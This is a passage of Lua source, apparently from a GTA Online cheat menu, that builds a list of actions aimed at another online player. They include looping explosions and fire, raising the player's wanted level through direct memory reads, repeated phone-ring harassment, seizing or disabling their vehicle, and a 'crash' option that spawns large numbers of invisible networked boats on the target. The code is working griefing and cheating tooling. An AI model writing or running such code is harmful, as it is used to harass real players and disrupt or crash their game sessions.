        else
            util.toast("玩家不在公寓里. :/")
        end
    end)
    menu.action(trolling, "送她一颗卫星", {}, "在该玩家面前刷出雷达", function()
        local radar = util.joaat("prop_air_bigradar")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        request_model(radar)
        local radar_dish = entities.create_object(radar, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), 0, 20, -3), ENTITY.GET_ENTITY_HEADING(player))
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(radar_dish)
        chat.send_message("加个微信吗，帅哥美女们！", false, true, true)
        util.yield(10000)
        entities.delete_by_handle(radar_dish)
    end)
    
    menu.click_slider(trolling, "给予通缉等级", {}, "", 1, 5, 5, 1, function(val)
        local playerInfo = memory.read_long(entities.handle_to_pointer(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)) + 0x10C8)
        while memory.read_uint(playerInfo + 0x0888) < val do
            for i = 1, 46 do
                PLAYER.REPORT_CRIME(PlayerID, i, val)
            end
            util.yield(75)
        end
    end)
    menu.toggle_loop(trolling,"火箭雨", {'rockets'}, '要下一场轰轰烈烈的火箭雨吗？', function()
		rain_rockets(PlayerID, false)
		wait(500)
	end)
    local shit = menu.list(trolling, "撒尿喷屎选项", {}, "")
    menu.toggle_loop(shit, "让他持续喷屎", {"peeloop"}, "奥里给吃多了", function(state)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local bone_index = PED.GET_PED_BONE_INDEX(player_ped, 0x2e28)
    request_ptfx_asset_peeloop("core_snow")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core_snow")
    ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(
        "cs_mich1_spade_dirt_throw", player_ped, 0, 0, 0, -90, 0, 0, bone_index, 2, false, false, false
    ) 
end)
    blow = menu.list(trolling, "爆炸恶搞", {}, "")
    menu.toggle_loop(blow, "伤害爆炸", {""}, "在玩家身上循环伤害的爆炸", function()
        local playerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), true)
        SE_add_explosion(playerCoords['x'], playerCoords['y'], playerCoords['z'], 2, 2, SEisExploAudible, SEisExploInvis, 1, true)
    end)	
    menu.toggle_loop(blow, "无伤害爆炸", {"boomOK"}, "在玩家身上循环无伤害的爆炸", function()
        local playerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), true)
        SE_add_explosion(playerCoords['x'], playerCoords['y'], playerCoords['z'], 1, 2, SEisExploAudible, SEisExploInvis, 0, true)
    end)	
    menu.toggle_loop(trolling, "喷火", {"spouting"}, "经典恶搞之一", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)
    end)
    menu.toggle_loop(trolling, "喷水", {""}, "经典恶搞之一", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)
    end)
    menu.toggle_loop(shit, "在他身上撒尿", {}, ":尿他就完事了:", function()
        local coords = players.get_position(PlayerID)
        coords.z = coords['z'] + 1
        util.yield(65)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 79, 0, false, false, 0, false)
    end)
    pan = menu.list(trolling, "卡飞", {}, "")
    Ptools_PanTable = {}
   Ptools_PanCount = 1
   Ptools_FishPan = 20
   menu.action(pan, "开始卡飞", {}, "让他卡", function()
   menu.trigger_commands("anticrashcam on")
    local targetped = PLAYER.GET_PLAYER_PED(PlayerID)
       local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)
       local hash = util.joaat("tug")
       STREAMING.REQUEST_MODEL(hash)
       while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
       for i = 1, Ptools_FishPan do
           Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
           ----
           local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
           NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
           NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
           NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
           NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, PlayerID, true)
           ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
           ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
           ----
           if SE_Notifications then
               util.toast("干！！！ " .. Ptools_PanCount)
           end
           Ptools_PanCount = Ptools_PanCount + 1
       end
   end)
   menu.slider(pan, "卡飞时间", {"friedfish"}, "卡飞时间，时间越多月卡", 1, 300, 20, 1, function(value)
       Ptools_FishPan = value
   end)
   menu.action(pan, "取消", {"rmpan"}, "Yep", function ()
       for x = 1, 5, 1 do
           for i = 1, #Ptools_PanTable do
               entities.delete_by_handle(Ptools_PanTable[i])
               util.yield(10)
           end
       end
       --
       Ptools_PanCount = 1
       Ptools_PanTable = {}
       STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("tug"))
       util.yield(800)
       menu.trigger_commands("anticrashcam off")
   end)
   menu.action(trolling, "小行星攻击", {}, "用小行星来攻击他", function() 
        local coords = players.get_position(PlayerID)
        coords.z = coords['z'] + 15.0
        local asteroid = entities.create_object(3751297495, coords)
        ENTITY.SET_ENTITY_DYNAMIC(asteroid, true)
    end)
   menu.toggle_loop(trolling, "走路带火", {}, "跑起来吧！！!", function()
        local coords = players.get_position(PlayerID)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 38, 0, false, false, 0, false)
        util.yield(65)
    end)
    menu.action(trolling, "强制进入自由模式任务", {}, "强制玩家进入自由模式任务", function()
        menu.trigger_commands("mission".. players.get_name(PlayerID))
    end)
menu.toggle_loop(trolling, "起伏不平", {}, "", function() 
  local ramp_hash = util.joaat("stt_prop_ramp_jump_s")
  local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
  local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 10, -2)
  local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
  STREAMING.REQUEST_MODEL(ramp_hash)
while not STREAMING.HAS_MODEL_LOADED(ramp_hash) do
   wait(10)
 end
local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)
    ENTITY.SET_ENTITY_VISIBLE(ramp, true)
    ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
    wait(2000)
    entities.delete_by_handle(ramp)
end)
    menu.toggle(trolling, "假掉钱袋", {""}, "", function()
           menu.trigger_commands("fakemoneydrop " .. players.get_name(PlayerID))
    end)
    menu.toggle(trolling, "阻止玩家被动模式", {""}, "", function()
        menu.trigger_commands("nopassivemode " .. players.get_name(PlayerID))
    end)

    menu.action(trolling2, "大圆球", {}, "", function()
        Hamster_Ball(PlayerID)
    end)
    menu.toggle_loop(trolling2, "假钱雨", {}, "", function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        Streamptfx('core')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( 'ent_brk_banknotes', tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 3.0, true, true, true)
    end)
    menu.toggle_loop(trolling2, "送给玩家一堆peds", {"toggletppeds"}, "", function (on_toggle)
            if on_toggle then
                TpAllPeds(PlayerID)
            else
                TpAllPeds(PlayerID)
            end
    end)
    menu.toggle_loop(trolling2, "送给玩家一堆车", {"toggletppedstpvehs"}, "", function (on_toggle)
            if on_toggle then
                TpAllVehs(PlayerID)
            else
                TpAllVehs(PlayerID)
            end
    end)
    menu.toggle_loop(trolling2, "送给玩家惊喜", {"tpobjs"}, "", function (on_toggle)
            if on_toggle then
                TpAllObjects(PlayerID)
            else
                TpAllObjects(PlayerID)
            end
    end)
    menu.toggle_loop(trolling2, "超级惊喜！！！", {"bigsurprised"}, "爱他，就要给他超级惊喜", function (on_toggle)
            stcnm(PlayerID)
            phonesoundcnm(PlayerID)
            if on_toggle then
                TpAllPeds(PlayerID)
            else
                TpAllPeds(PlayerID)
            end
            if on_toggle then
                TpAllVehs(PlayerID)
            else
                TpAllVehs(PlayerID)
            end
           local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        Streamptfx('core')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( 'ent_brk_banknotes', tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 3.0, true, true, true)
    end)
    menu.toggle_loop(trolling2, "骚扰她", {""}, "欠钱不换，必须骚扰", function()
        stcnm(PlayerID)
        menu.trigger_commands("ring".. PLAYER.GET_PLAYER_NAME(PlayerID))
    end)	
	menu.toggle_loop(trolling2, "骚扰她V2", {""}, "st", function()
        phonesoundcnm(PlayerID)
    end)	
    menu.toggle_loop(trolling2, "防空系统启动", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Air_Defences_Activated", PLAYER.GET_PLAYER_PED(PlayerID), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(8000)
    end)
    menu.toggle_loop(trolling2, "超级骚扰", {""}, "欠钱不换，必须骚扰", function()
        stcnm(PlayerID)
        phonesoundcnm(PlayerID)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Air_Defences_Activated", PLAYER.GET_PLAYER_PED(PlayerID), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(8000)
    end)
    local weapon_trolling = menu.list(trolling2, "武器恶搞", {}, "")
    local yanhuaegao = menu.list(trolling2, "烟花恶搞", {}, "新年快乐~！")
    menu.toggle_loop(weapon_trolling, "电击玩家", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), false, false, true, 1.0)
    end)
	menu.toggle_loop(weapon_trolling, "重型狙击枪", {}, "", function()
		local hash <const> = util.joaat("weapon_heavysniper")
		local camPos = CAM.GET_GAMEPLAY_CAM_COORD()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), false)
		request_weapon_asset(hash)
		WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(camPos.x, camPos.y, camPos.z, pos.x, pos.y, pos.z, 200, false, hash, players.user_ped(), true, false, -1.0)
	end)
	menu.toggle_loop(weapon_trolling, "原子波", {}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), false)
		local hash <const> = util.joaat("weapon_raypistol")
		request_weapon_asset(hash)
		WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
	end)
	menu.toggle_loop(weapon_trolling, "燃烧弹", {}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), false)
		local hash <const> = util.joaat("weapon_molotov")
		request_weapon_asset(hash)
		WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
	end)
	menu.toggle_loop(weapon_trolling, "电磁脉冲发射器", {}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), false)
		local hash <const> = util.joaat("weapon_emplauncher")
		request_weapon_asset(hash)
		WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
	end)
	menu.toggle_loop(yanhuaegao, "烟花", {"Fireworksdownward"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), false)
		local hash <const> = util.joaat("weapon_firework")
		request_weapon_asset(hash)
		WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
	end)
    local firw = {speed = 1000}
    menu.toggle_loop(yanhuaegao, '头顶上的烟花', {"toudingyanhua"}, '给他一场来自头顶的烟花盛宴', function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        local weap = util.joaat('weapon_firework')
        WEAPON.REQUEST_WEAPON_ASSET(weap)
        for y = 0, 1 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
            FIRE.ADD_EXPLOSION(tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false)
            FIRE.ADD_EXPLOSION(tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false) 
        end
    end)
    menu.toggle_loop(yanhuaegao, '脚下的惊喜', {"jiaoxiayanhua"}, '给他一场来自脚下的烟花盛宴', function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        local weap = util.joaat('weapon_firework')
        WEAPON.REQUEST_WEAPON_ASSET(weap)
        for y = 0, 1 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + -1.0, tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
            --MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 2.0, tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
            FIRE.ADD_EXPLOSION(tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false)
            FIRE.ADD_EXPLOSION(tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false) 
        end
    end)
    menu.action(trolling2, "消防栓的自由", {"xiaofangshuan"}, "", function()
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)
        util.request_model(200846641)
        local objects = {}
        for i = 1, 40 do
            local coords<const> = players.get_position(PlayerID)
            objects[#objects + 1] = entities.create_object(200846641, v3.new(coords.x + math.random(-5, 5), coords.y + math.random(-5, 5), coords.z))
            util.yield()
        end
        util.yield(3000)
        for i = 1, 4 do
            local coords<const> = players.get_position(PlayerID)
            FIRE.ADD_EXPLOSION(coords.x + math.random(-3, 3), coords.y + math.random(-3, 3), coords.z, 64, 100, true, true, 0.5, true)
            util.yield(400)
        end
        util.yield(5000)
        for i = 1, #objects do
            entities.delete_by_handle(objects[i])
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(200846641)
    end)
menu.toggle(trolling2, "闪他(会使他掉帧)", {"shanta"}, "远离!!!", function(state)
        if players.exists(PlayerID) then
        huaping = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(PlayerID).." on")
            menu.trigger_commands("confuse "..players.get_name(PlayerID).." on")
            while huaping do
        local player_pos = players.get_position(PlayerID)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(PlayerID).." off")
            menu.trigger_commands("confuse "..players.get_name(PlayerID).." off")
        end
    end
end)
	menu.action(trolling2, "苦力怕小丑", {"creeper"}, "生成一个自曝小丑跑向玩家并自爆!", function()
		creep(PlayerID)
	end, nil, nil, COMMANDPERM_RUDE)
Aes = menu.list(trolling2, "动物娱乐", {}, "")
    menu.action(Aes, "汪汪队", {"wowo"}, "汪汪~", function(on_click)
        meowbmob(PlayerID)
    end)
    local player_jinx_army = {}
    local army_player = menu.list(Aes, "汪汪队出动！", {}, "")
    menu.click_slider(army_player, "生成汪汪队", {}, "跟随玩家", 1, 50, 10, 1, function(val)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1
        local jinx = util.joaat("A_C_chop")
        request_model(jinx)
        for i = 1, val do
            player_jinx_army[i] = entities.create_ped(28, jinx, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(player_jinx_army[i], true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_jinx_army[i], true)
            PED.SET_PED_COMPONENT_VARIATION(player_jinx_army[i], 0, 0, 1, 0)
            TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_jinx_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
            wait()
        end 
    end)

    menu.action(army_player, "清除汪汪队", {}, "", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("A_C_chop")) then
                entities.delete_by_handle(ped)
            end
        end
    end)
   menu.action(trolling2,"垃圾车的工作时间", {}, "", function()
        veh_to_attach = 1
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		if table_kidnap == nil then
			table_kidnap = {}
		end
        hash = util.joaat("trash")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end
            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}
            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
            util.yield(500)
            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
        end
end)
    local zaijuegao = menu.list(bozo, "载具恶搞", {}, "")
    menu.action(zaijuegao, "小恐龙来喽~", {""}, "嗷呜~~~~~", function(on_click)
        changemodel(PlayerID)
    end)
    menu.action(zaijuegao, "奇怪附加模型的载具恶搞", {""}, "不知如何形容", function(on_click)
        jibamodel(PlayerID)
    end)
    menu.toggle_loop(zaijuegao, "载具卡顿", {""}, "让他以为是延迟的问题", function ()
        letcarlagging(PlayerID)
    end)
   menu.toggle_loop(zaijuegao, "压榨他", {"crush"}, "压出自我，压出快感，鲁花5S压榨花生油.", function(on_click)
      store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound10.txt'
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z'] + 20.0
        request_model(1917016601)
        local truck = entities.create_vehicle(1917016601, coords, 0.0)
        local vel = ENTITY.GET_ENTITY_VELOCITY(vel)
        ENTITY.SET_ENTITY_VELOCITY(truck, vel['x'], vel['y'], -100.0)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED(truck, 3)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(truck, true)
		wait(2000)
		entities.delete_by_handle(truck)
    end)
    menu.action(zaijuegao, "爆他胎", {}, "考验他的驾驶技术", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        if car ~= 0 then
            request_control_of_entity(car)
            for i=0, 7 do
                VEHICLE.SET_VEHICLE_TYRE_BURST(car, i, true, 1000.0)
            end
        end
    end)
    menu.toggle_loop(zaijuegao, "螺旋汽车", {"beybladev"}, "让他晕头转向", function(on)
        carspin(PlayerID)
    end)
     menu.action(zaijuegao, "删除载具", {}, "删除此玩家正在驾驶的载具", function()
        deleplayercar(PlayerID)
    end)
    local kickcar1 = menu.list(zaijuegao, "载具踢出选项", {}, "")
    menu.action(kickcar1, "踢出载具V1", {}, "", function(toggled)
        kickcar(PlayerID)
    end)
    menu.action(kickcar1, "踢出载具V2", {}, "", function()
        menu.trigger_commands("vehkick".. players.get_name(PlayerID))
    end)
    menu.action(zaijuegao, "将墙放在玩家面前", {}, "在玩家面前放置墙壁,半秒后删除", function ()
        qfmq(PlayerID)
    end)
    menu.toggle(zaijuegao, "强制手刹", {}, "", function(on)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
    if car ~= 0 then
        request_control_of_entity(car)
        VEHICLE.SET_VEHICLE_HANDBRAKE(car, on)
    end
    end)
    menu.toggle_loop(zaijuegao, "随机制动", {}, "随机刹车", function(on)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
    if car ~= 0 then
        request_control_of_entity(car)
        VEHICLE.SET_VEHICLE_HANDBRAKE(car, true)
        util.yield(500)
        request_control_of_entity(car)
        VEHICLE.SET_VEHICLE_HANDBRAKE(car, false)
        util.yield(math.random(3000, 15000))
    end
end)
    menu.action(zaijuegao, "将载具调头", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local rot = ENTITY.GET_ENTITY_ROTATION(car, 0)
            local vel = ENTITY.GET_ENTITY_VELOCITY(car)
            ENTITY.SET_ENTITY_ROTATION(car, rot['x'], rot['y'], rot['z']+180, 0, true)
            ENTITY.SET_ENTITY_VELOCITY(car, -vel['x'], -vel['y'], vel['z'])
        end
    end)

    menu.action(zaijuegao, "将载具翻转", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local rot = ENTITY.GET_ENTITY_ROTATION(car, 0)
            local vel = ENTITY.GET_ENTITY_VELOCITY(car)
            ENTITY.SET_ENTITY_ROTATION(car, rot['x'], rot['y']+180, rot['z'], 0, true)
            ENTITY.SET_ENTITY_VELOCITY(car, -vel['x'], -vel['y'], vel['z'])
        end
    end)
    menu.list_action(zaijuegao, "搞他车门", {}, "", {"全部打开", "全部关闭", "损坏车门"}, function(index, value, click_type)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local d = VEHICLE.GET_NUMBER_OF_VEHICLE_DOORS(car)
            for i=0, d do
                pluto_switch index do
                    case 1: 
                        VEHICLE.SET_VEHICLE_DOOR_OPEN(car, i, false, true)
                        break
                    case 2:
                        VEHICLE.SET_VEHICLE_DOOR_SHUT(car, i, true)
                        break
                    case 3:
                        VEHICLE.SET_VEHICLE_DOOR_BROKEN(car, i, false)
                        break
                end
            end
        end
    end)
    menu.action(zaijuegao, "关掉他的发动机", {}, "让他懵逼", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_ENGINE_ON(car, false, true, false)
        end
    end)
control_veh = player_toggle_loop(zaijuegao, PlayerID, "他的载具由你控制", {}, "必须在陆地上的载具才能使用该功能,对部分菜单无效", function(toggle)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
        local class = VEHICLE.GET_VEHICLE_CLASS(player_veh)
        if not players.exists(PlayerID) then util.stop_thread() end

        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(PlayerID)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            util.toast("精神小伙提醒你:距离玩家太远了")
            menu.set_value(control_veh, false)
        return end

        if class == 15 then
            util.toast("精神小伙提醒你:玩家在直升机上")
            menu.set_value(control_veh, false)
        return end
        
        if class == 16 then
            util.toast("精神小伙提醒你:玩家在飞机上")
            menu.set_value(control_veh, false)
        return end

        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            if PAD.IS_CONTROL_PRESSED(0, 34) then
                while not PAD.IS_CONTROL_RELEASED(0, 34) do
